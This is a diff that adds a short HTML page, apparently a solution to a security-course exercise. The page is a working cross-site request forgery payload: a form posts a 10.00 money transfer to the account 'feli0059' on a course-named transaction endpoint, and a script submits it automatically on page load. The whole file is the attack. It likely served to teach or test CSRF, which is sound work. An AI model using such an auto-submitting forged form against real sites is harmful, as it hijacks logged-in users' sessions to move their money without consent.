@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <form id="transaction_form" action="https://final.csci3403.com/transaction" method="post">
+            <input name="to" type="hidden" value="feli0059">
+            <input name="amount" type="number" placeholder="Amount" min="0.01" step="0.01" value="10.00" required="">
+            <input id="send_money" type="submit" value="Send money">
+        </form>
+        <script>
+            document.getElementById('transaction_form').submit();
+        </script>
+    </body>
+</html>
